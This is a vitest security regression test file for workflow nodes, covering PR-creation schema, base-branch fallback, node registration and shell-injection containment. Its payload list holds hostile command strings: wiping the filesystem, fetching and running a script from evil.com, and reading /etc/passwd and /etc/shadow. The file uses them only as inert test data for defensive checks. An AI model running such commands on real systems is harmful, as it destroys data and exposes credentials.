/**
 * workflow-nodes-security.test.mjs - Security regression tests for workflow nodes.
 *
 * Verifies:
 *  1. `action.create_pr` schema has both `base` and `branch` properties defined
 *     for backward-compatible workflow payloads.
 *  2. Node type registrations are well-formed and don't expose shell injection
 *     vectors through dynamic payload interpolation.
 *  3. The `create_pr` handler resolves `base` (not `branch`) as the base branch
 *     in Bosun lifecycle handoff payloads.
 *  4. Dangerous shell meta-characters in node config are treated as plain data
 *     and never routed into direct PR creation commands.
 */

import { describe, it, expect, vi } from "vitest";
import { getNodeType } from "../workflow-nodes.mjs";
import { WorkflowContext } from "../workflow-engine.mjs";

// -- Helpers ------------------------------------------------------------------

function makeCtx(data = {}) {
  const ctx = new WorkflowContext(data);
  ctx.log = vi.fn();
  return ctx;
}

function makeNode(type, config = {}, id = "test-node") {
  return { id, type, config };
}

// -- create_pr Schema Integrity ------------------------------------------------

describe("action.create_pr schema integrity", () => {
  it("is registered as a node type", () => {
    const nodeType = getNodeType("action.create_pr");
    expect(nodeType).toBeDefined();
  });

  it("schema defines a 'base' property for the base branch", () => {
    const nodeType = getNodeType("action.create_pr");
    const props = nodeType.schema?.properties ?? {};
    expect(props).toHaveProperty("base");
    expect(props.base.type).toBe("string");
  });

  it("schema defines a 'branch' property for the head branch", () => {
    const nodeType = getNodeType("action.create_pr");
    const props = nodeType.schema?.properties ?? {};
    expect(props).toHaveProperty("branch");
    expect(props.branch.type).toBe("string");
  });

  it("schema also accepts 'baseBranch' as a legacy alias", () => {
    const nodeType = getNodeType("action.create_pr");
    const props = nodeType.schema?.properties ?? {};
    expect(props).toHaveProperty("baseBranch");
  });

  it("schema requires 'title' but not 'base' or 'branch'", () => {
    const nodeType = getNodeType("action.create_pr");
    const required = nodeType.schema?.required ?? [];
    expect(required).toContain("title");
    expect(required).not.toContain("base");
    expect(required).not.toContain("branch");
  });

  it("has a describe() function returning a non-empty string", () => {
    const nodeType = getNodeType("action.create_pr");
    const desc = nodeType.describe();
    expect(typeof desc).toBe("string");
    expect(desc.length).toBeGreaterThan(0);
  });
});

// -- create_pr Base-Branch Resolution -----------------------------------------

describe("action.create_pr base-branch resolution logic", () => {
  it("uses 'base' config field as the PR base branch", async () => {
    const node = makeNode("action.create_pr", {
      title: "feat: add thing",
      base: "develop",
      baseBranch: "should-not-use-this",
      branch: "feat/add-thing",
    });
    const nodeType = getNodeType("action.create_pr");
    const result = await nodeType.execute(node, makeCtx());
    expect(result.base).toBe("develop");
  });

  it("falls back to 'baseBranch' when 'base' is absent", async () => {
    const node = makeNode("action.create_pr", {
      title: "feat: add thing",
      baseBranch: "release",
      branch: "feat/add-thing",
    });
    const nodeType = getNodeType("action.create_pr");
    const result = await nodeType.execute(node, makeCtx());
    expect(result.base).toBe("release");
  });

  it("falls back to 'main' when neither base nor baseBranch is set", async () => {
    const node = makeNode("action.create_pr", {
      title: "feat: add thing",
      branch: "feat/add-thing",
    });
    const nodeType = getNodeType("action.create_pr");
    const result = await nodeType.execute(node, makeCtx());
    expect(result.base).toBe("main");
  });
});

// -- Node Registration Completeness -------------------------------------------

describe("critical node types are registered", () => {
  const requiredNodeTypes = [
    "action.run_agent",
    "action.run_command",
    "action.create_pr",
    "action.create_task",
    "action.update_task_status",
    "action.git_operations",
    "condition.expression",
    "condition.switch",
    "trigger.manual",
    "trigger.schedule",
    "trigger.task_assigned",
  ];

  for (const nodeType of requiredNodeTypes) {
    it(`node type "${nodeType}" is registered`, () => {
      expect(getNodeType(nodeType)).toBeDefined();
    });

    it(`node type "${nodeType}" has an execute function`, () => {
      const nt = getNodeType(nodeType);
      expect(typeof nt.execute).toBe("function");
    });

    it(`node type "${nodeType}" has a valid schema with properties`, () => {
      const nt = getNodeType(nodeType);
      expect(nt.schema).toBeDefined();
      expect(typeof nt.schema).toBe("object");
    });
  }
});

describe("action.create_task adapter contract", () => {
  it("passes projectId separately for two-argument kanban adapters", async () => {
    const nodeType = getNodeType("action.create_task");
    const createTask = vi.fn(async function createTaskAdapter(projectId, taskData) {
      if (projectId && taskData) {
        return { id: "task-42" };
      }
      return { id: "task-fallback" };
    });
    const node = makeNode("action.create_task", {
      title: "[m] fix(workflow): create task contract",
      description: "Ensure compatibility",
      status: "todo",
      projectId: "proj-42",
    });

    const result = await nodeType.execute(node, makeCtx(), {
      services: {
        kanban: {
          createTask,
        },
      },
    });

    expect(result.success).toBe(true);
    expect(result.taskId).toBe("task-42");
    expect(createTask).toHaveBeenCalledWith("proj-42", {
      title: "[m] fix(workflow): create task contract",
      description: "Ensure compatibility",
      status: "todo",
      priority: undefined,
      tags: undefined,
    });
  });
});

// -- Dangerous Payload Containment ---------------------------------------------

describe("dangerous shell payload containment", () => {
  const dangerousInputs = [
    "; rm -rf /",
    "$(curl evil.com)",
    "| cat /etc/passwd",
    "&& wget http://evil.com/payload.sh | bash",
    "`id`",
    "${IFS}cat${IFS}/etc/shadow",
  ];

  it("action.create_pr implementation does not include a direct PR-create command", () => {
    const nodeType = getNodeType("action.create_pr");
    const executeSrc = nodeType.execute.toString();
    expect(executeSrc).not.toContain("gh pr create");
  });

  it("action.run_command schema does not silently accept untrusted commands", () => {
    // action.run_command intentionally accepts a freeform shell command string -
    // this is by design. What matters is that the schema documents this and
    // requires explicit configuration by the workflow author.
    const nodeType = getNodeType("action.run_command");
    const props = nodeType.schema?.properties ?? {};
    expect(props).toHaveProperty("command");
    expect(props.command.type).toBe("string");
    // The schema must NOT mark 'command' as having a default value - it must
    // be explicitly provided by the workflow author
    expect(props.command.default).toBeUndefined();
  });

  it("dangerous input strings are treated as plain lifecycle-handoff payload", async () => {
    const nodeType = getNodeType("action.create_pr");
    for (const input of dangerousInputs) {
      const node = makeNode("action.create_pr", {
        title: input,
        body: input,
        branch: "feat/safety-test",
      });
      const result = await nodeType.execute(node, makeCtx());
      expect(result.success).toBe(true);
      expect(result.handedOff).toBe(true);
      expect(result.title).toBe(input);
      expect(result.body).toBe(input);
    }
  });
});

// -- action.git_operations Safety ----------------------------------------------

describe("action.git_operations schema safety", () => {
  it("is registered and has an operations enum", () => {
    const nodeType = getNodeType("action.git_operations");
    expect(nodeType).toBeDefined();
    const props = nodeType.schema?.properties ?? {};
    // Should have an 'operation' property with enum values
    expect(props).toHaveProperty("operation");
  });

  it("supported operations list is an array of strings", () => {
    const nodeType = getNodeType("action.git_operations");
    const props = nodeType.schema?.properties ?? {};
    const opEnum = props.operation?.enum;
    expect(Array.isArray(opEnum)).toBe(true);
    expect(opEnum.every((v) => typeof v === "string")).toBe(true);
  });

  it("supports common safe git operations", () => {
    const nodeType = getNodeType("action.git_operations");
    const props = nodeType.schema?.properties ?? {};
    const opEnum = props.operation?.enum ?? [];
    for (const op of ["commit", "push", "checkout"]) {
      expect(opEnum, `operation "${op}" should be in the allowed enum`).toContain(op);
    }
  });
});

// -- WorkflowContext resolve() does not evaluate shell in template expressions -

describe("WorkflowContext template resolution is not a shell evaluator", () => {
  it("resolves simple mustache variables without executing shell commands", () => {
    const ctx = makeCtx({ name: "alice" });
    const result = ctx.resolve("Hello {{name}}");
    expect(result).toBe("Hello alice");
  });

  it("leaves shell metacharacters intact without execution", () => {
    const ctx = makeCtx({ cmd: "$(whoami)" });
    const result = ctx.resolve("Injected: {{cmd}}");
    expect(result).toBe("Injected: $(whoami)");
    // No actual command execution should have happened
  });

  it("resolves missing variables to empty string, not to the variable name", () => {
    const ctx = makeCtx({});
    const result = ctx.resolve("{{unknown_var}}");
    // Must not execute shell - result is empty or the original token
    expect(typeof result).toBe("string");
    // Critical: must not return a non-string value (e.g. process object)
    expect(result).not.toBeNull();
  });
});
